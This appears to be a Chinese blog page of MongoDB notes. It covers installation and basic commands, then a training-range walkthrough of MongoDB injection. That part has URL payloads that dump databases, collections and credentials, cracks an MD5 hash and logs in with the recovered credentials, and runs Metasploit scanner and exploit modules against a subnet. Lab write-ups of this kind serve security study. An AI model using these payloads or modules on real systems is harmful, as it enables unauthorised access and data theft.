@@ -1,0 +1,579 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="MongoDB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MongoDB总结">
+<meta property="og:url" content="http://example.com/2021/06/22/MongoDB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="MongoDB">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414081629629.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414082431111.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414082457605.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414082526916.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414082600249.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414082747337.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414082806545.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414153913146.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414154255592.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414154822690.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414171040842.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414172047978.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414174305969.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414174531888.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414174614960.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414175303240.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414175348260.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414175632808.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414180136422.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414180224127.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414180510785.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414180628256.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414180831544.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414180925798.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619698551399.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619698563509.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619698683292.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619698696446.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619698729160.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619698908561.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619699059432.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619699101231.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619699164607.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619699181276.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619700092357.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619700202476.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619700225858.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619702487926.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619703576348.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619704557151.png">
+<meta property="og:image" content="c:/Users/12550/AppData/Roaming/Typora/typora-user-images/1619704731351.png">
+<meta property="article:published_time" content="2021-06-22T11:01:29.332Z">
+<meta property="article:modified_time" content="2021-06-22T10:50:00.239Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="MongoDB总结">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210414081629629.png"><title>MongoDB总结 | Hexo</title><link ref="canonical" href="http://example.com/2021/06/22/MongoDB/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">MongoDB总结</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-06-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-06-22</span></span></div></header><div class="post-body"><p><strong>MongoDB</strong></p>
+<span id="more"></span>
+
+
+        <h1 id="MongoDB"   >
+          <a href="#MongoDB" class="heading-link"><i class="fas fa-link"></i></a><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h1>
+      
+        <h2 id="默认端口"   >
+          <a href="#默认端口" class="heading-link"><i class="fas fa-link"></i></a><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h2>
+      <p>默认端口–&gt;27017–&gt;mongod和 mongos实例的默认端口。你可以通过port或-port改变该端口</p>
+<p>默认端口–&gt;27018–&gt;设置–shardsvr运行变量或在配置文件里设置clusterRole为shardsvr时的默认端口</p>
+
+        <h2 id="Windows平台安装MongoDB"   >
+          <a href="#Windows平台安装MongoDB" class="heading-link"><i class="fas fa-link"></i></a><a href="#Windows平台安装MongoDB" class="headerlink" title="Windows平台安装MongoDB"></a>Windows平台安装MongoDB</h2>
+      <p>官网下载地址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.mongodb.com/try/download/community" >https://www.mongodb.com/try/download/community</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>我这边在Windows环境下载的</p>
+<p><img src="https://img-blog.csdnimg.cn/20210414081629629.png" alt="在这里插入图片描述"></p>
+<p>搞的是最新版的</p>
+<p>默认安装就可以了</p>
+<p>安装完成就打开了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210414082431111.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210414082457605.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210414082526916.png" alt="在这里插入图片描述"></p>
+<p>默认没啥字密码 直接连接就可以</p>
+<p><img src="https://img-blog.csdnimg.cn/20210414082600249.png" alt="在这里插入图片描述"></p>
+<p>到安装目录去了解一下</p>
+<p><img src="https://img-blog.csdnimg.cn/20210414082747337.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210414082806545.png" alt="在这里插入图片描述"></p>
+<ul>
+<li>mongo.exe # MongoDB客户端软件</li>
+<li>mongod.exe # MongoDB服务端软件</li>
+<li>mongod.cfg      # MongDb的配置文件</li>
+</ul>
+<p>解析一下MongDb的配置文件</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#系统日志相关</span><br><span class="line">systemLog:</span><br><span class="line">destination: file #使用文件存储日志</span><br><span class="line">path:C：mongodb\Log\mongodb.<span class="built_in">log</span>#日志位置![在这里插入图片描述](https:<span class="comment">//img-blog.csdnimg.cn/20210414153819455.png)</span></span><br><span class="line"></span><br><span class="line">LogAppend:<span class="literal">true</span>#  是否以追加的形式记录日志</span><br><span class="line"></span><br><span class="line">#数据相关</span><br><span class="line">storage:</span><br><span class="line">journal: #回滚日志</span><br><span class="line">enabled <span class="literal">true</span> </span><br><span class="line">dbPath:C：mongodb\data #数据存储目录</span><br><span class="line"></span><br><span class="line">#网络配置相关</span><br><span class="line">net:</span><br><span class="line">port：<span class="number">27017</span>  #默认端口</span><br><span class="line">bindIp：<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  #绑定ip</span><br></pre></td></tr></table></div></figure>
+
+<p>这里这个绑定ip是本地的 </p>
+<p>我们修改一下 </p>
+<p><img src="https://img-blog.csdnimg.cn/20210414153913146.png" alt="在这里插入图片描述"></p>
+<p>碰到权限问题 自己处理一下</p>
+<p>然后去配置环境变量</p>
+<p>把bin目录的路径 添加到环境变量中的系统变量中的Path中</p>
+<p><img src="https://img-blog.csdnimg.cn/20210414154255592.png" alt="在这里插入图片描述"></p>
+<p>就可以了 </p>
+<p>测试一下</p>
+<p><img src="https://img-blog.csdnimg.cn/20210414154822690.png" alt="在这里插入图片描述"></p>
+<p>管理Mongodb数据库的话</p>
+<p>也是有工具的 自己去下载一下</p>
+<p>navicat150_mongodb_cs_x64</p>
+<p>robo3t-1.4.3-windows-x86_64-48f7dfd</p>
+<p>都是可以的 安装的话 默认然后一直下一步就好了</p>
+
+        <h2 id="kali下安装MongoDB"   >
+          <a href="#kali下安装MongoDB" class="heading-link"><i class="fas fa-link"></i></a><a href="#kali下安装MongoDB" class="headerlink" title="kali下安装MongoDB"></a>kali下安装MongoDB</h2>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO - https:<span class="comment">//www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add -</span></span><br></pre></td></tr></table></div></figure>
+<p>应该要响应OK的</p>
+<p><img src="https://img-blog.csdnimg.cn/20210414171040842.png" alt="在这里插入图片描述"></p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;deb http://repo.mongodb.org/apt/debian buster/mongodb-org/4.4 main&quot;</span> | sudo tee /etc/apt/sources.<span class="built_in">list</span>.d/mongodb-org<span class="number">-4.4</span>.<span class="built_in">list</span></span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210414172047978.png" alt="在这里插入图片描述"><br>sudo apt-get update</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains apt-get install -y mongodb-org </span><br></pre></td></tr></table></div></figure>
+
+<p>这边要科学上网才可以</p>
+<p>这个我就不说了</p>
+<p>启动命令</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start mongod</span><br></pre></td></tr></table></div></figure>
+
+<p>查看一下端口</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nultp</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210414174305969.png" alt="在这里插入图片描述"></p>
+<p>修改登录IP  因为我们要远程登录的嘛</p>
+<p>找一下它的配置文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210414174531888.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210414174614960.png" alt="在这里插入图片描述"><br>重新启动Mongodb数据库</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart mongod</span><br></pre></td></tr></table></div></figure>
+
+<p>Windows远程连接Kali</p>
+<p><img src="https://img-blog.csdnimg.cn/20210414175303240.png" alt="在这里插入图片描述"><br>填写kali的IP</p>
+<p>测试连接一下 是成功的</p>
+<p><img src="https://img-blog.csdnimg.cn/20210414175348260.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210414175632808.png" alt="在这里插入图片描述"><br>ok这就连接成功了</p>
+
+        <h2 id="简单使用一下"   >
+          <a href="#简单使用一下" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单使用一下" class="headerlink" title="简单使用一下"></a>简单使用一下</h2>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mongo 进来</span><br><span class="line">show dbs 查库</span><br><span class="line">use a001 创建一个库</span><br><span class="line">这里要注意 只有这个库下有东西 查库的时候 才会显示</span><br><span class="line">现在还是虚的</span><br><span class="line">db 查看当前在哪个库下</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">把data数据插入到a001数据库下</span><br><span class="line">db.data.insert(&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;test1&quot;</span>&#125;)</span><br></pre></td></tr></table></div></figure>
+
+
+<p><img src="https://img-blog.csdnimg.cn/20210414180136422.png" alt="在这里插入图片描述"></p>
+<p>查数据库下的东西</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.data.find()</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><img src="https://img-blog.csdnimg.cn/20210414180224127.png" alt="在这里插入图片描述"></p>
+<p>因为插入的是data数据</p>
+<p>多来几条数据</p>
+<p>这里注意值可以一样 但是键是不可以一样的</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.data.insert(&#123;<span class="string">&quot;user2&quot;</span>:<span class="string">&quot;test1&quot;</span>&#125;)</span><br><span class="line">db.data.insert(&#123;<span class="string">&quot;user3&quot;</span>:<span class="string">&quot;test1&quot;</span>&#125;)</span><br><span class="line">db.data.insert(&#123;<span class="string">&quot;user4&quot;</span>:<span class="string">&quot;test1&quot;</span>&#125;)</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210414180510785.png" alt="在这里插入图片描述"><br>删除数据</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.data.remove(&#123;<span class="string">&quot;user4&quot;</span>:<span class="string">&quot;test1&quot;</span>&#125;)</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210414180628256.png" alt="在这里插入图片描述"><br>ok 就这样了</p>
+<p>删除集合  </p>
+<p>比如删除data集合用drop()方法</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show collections;</span><br><span class="line">db.data.drop()</span><br><span class="line">show collections;</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><img src="https://img-blog.csdnimg.cn/20210414180831544.png" alt="在这里插入图片描述"></p>
+<p>删除目前使用的数据库</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><img src="https://img-blog.csdnimg.cn/20210414180925798.png" alt="在这里插入图片描述"></p>
+<p>使 PHP Web应用程序能够使用 MongoDB，我们需要安装PHP驱动程序</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php-pear</span><br><span class="line">apt-get install php-mongodb</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="注入MongoDB"   >
+          <a href="#注入MongoDB" class="heading-link"><i class="fas fa-link"></i></a><a href="#注入MongoDB" class="headerlink" title="注入MongoDB"></a>注入MongoDB</h2>
+      <p>这边我用墨者学院的练习题进行演示一下</p>
+<p>免费的</p>
+<p>地址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.mozhe.cn/" >https://www.mozhe.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698551399.png" alt="1619698551399"></p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698563509.png" alt="1619698563509"></p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698683292.png" alt="1619698683292"></p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698696446.png" alt="1619698696446"></p>
+<p>1.单引号%27测试到注入点</p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698729160.png" alt="1619698729160"></p>
+<p>构造简单的链接测试回显</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/new_list.php?id=1&#x27;&#125;); return (&#123;title:1,content:&#x27;2</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698908561.png" alt="1619698908561"></p>
+<p>爆库</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/new_list.php?id=1&#x27;&#125;); return (&#123;title:tojson(db),content:&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619699059432.png" alt="1619699059432"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mozhe_cms_Authority</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+<p>爆表</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/new_list.php?id=1&#x27;&#125;); return (&#123;title:tojson(db.getCollectionNames()),content:&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p>db.getCollectionNames()返回的是数组，需要用to json转换为字符串</p>
+<p><strong>并且MongoDB数据库区分大小写</strong></p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619699101231.png" alt="1619699101231"></p>
+<p>爆字段</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/new_list.php?id=1&#x27;&#125;); return (&#123;title:tojson(db.Authority_confidential.find()[0]),</span><br><span class="line">content:&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p>是当前用的集合，find用于查找，0是第一条数据</p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619699164607.png" alt="1619699164607"></p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619699181276.png" alt="1619699181276"></p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619700092357.png" alt="1619700092357"></p>
+<p>说明只有两个表</p>
+<p>然后它的密码是md5加密的 去破解就好了</p>
+<p>贴个链接</p>
+<p> <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cmd5.com/" >www.cmd5.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619700202476.png" alt="1619700202476"></p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619700225858.png" alt="1619700225858"></p>
+<p>进行登录</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mozhe</span><br><span class="line">610254</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619702487926.png" alt="1619702487926"></p>
+<p>这里要讲一下</p>
+<p>mongodb的认证(authentication)与授权(authorization)</p>
+<p>连接Mongodb的时候，除了需要用户名，密码，还需要指定这个用户的认证db</p>
+<p>为什么需要指定这个认证db？</p>
+<p>是因为Mongodb允许存在多个同名的用户存在，但同名的用户认证db必须不能相同，如下： </p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo --host 219.153.49.228 -u &quot;mozhe&quot; --authenticationDatabase &quot;mozhe&quot; -p&#x27;610254&#x27;</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h2 id="MSF渗透MongoDB"   >
+          <a href="#MSF渗透MongoDB" class="heading-link"><i class="fas fa-link"></i></a><a href="#MSF渗透MongoDB" class="headerlink" title="MSF渗透MongoDB"></a>MSF渗透MongoDB</h2>
+      
+        <h3 id="未授权访问"   >
+          <a href="#未授权访问" class="heading-link"><i class="fas fa-link"></i></a><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3>
+      <p>MongDB默认端口是27017，当配置无验证时，存在未授权访问</p>
+<p>进行验证</p>
+<p>扫描对端或者网段有没有开启27017端口</p>
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619703576348.png" alt="1619703576348"></p>
+<p>就是这一条</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mongodb/mongodb_login</span><br><span class="line">set rhosts 192.168.175.0/24</span><br><span class="line">set threads 10</span><br><span class="line">exploit</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619704557151.png" alt="1619704557151"></p>
+
+        <h3 id="exp利用"   >
+          <a href="#exp利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp利用" class="headerlink" title="exp利用"></a>exp利用</h3>
+      <p>但是这里拿不到shell 也算是验证</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/misc/mongod_native_helper</span><br><span class="line">set rhosts 192.168.175.166</span><br><span class="line">exploit</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619704731351.png" alt="1619704731351"></p>
+
+        <h2 id="自动化评估"   >
+          <a href="#自动化评估" class="heading-link"><i class="fas fa-link"></i></a><a href="#自动化评估" class="headerlink" title="自动化评估"></a>自动化评估</h2>
+      </div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://example.com">John Doe</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://example.com/2021/06/22/MongoDB/">http://example.com/2021/06/22/MongoDB/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/MongoDB%E6%80%BB%E7%BB%93/">MongoDB总结</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/06/22/Nginx/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Nginx总结</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/06/22/Jboss/"><span class="paginator-prev__text">Jboss总结</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MongoDB"><span class="toc-number">1.</span> <span class="toc-text">
+          MongoDB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.1.</span> <span class="toc-text">
+          默认端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E5%B9%B3%E5%8F%B0%E5%AE%89%E8%A3%85MongoDB"><span class="toc-number">1.2.</span> <span class="toc-text">
+          Windows平台安装MongoDB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kali%E4%B8%8B%E5%AE%89%E8%A3%85MongoDB"><span class="toc-number">1.3.</span> <span class="toc-text">
+          kali下安装MongoDB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">
+          简单使用一下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5MongoDB"><span class="toc-number">1.5.</span> <span class="toc-text">
+          注入MongoDB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%B8%97%E9%80%8FMongoDB"><span class="toc-number">1.6.</span> <span class="toc-text">
+          MSF渗透MongoDB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.6.1.</span> <span class="toc-text">
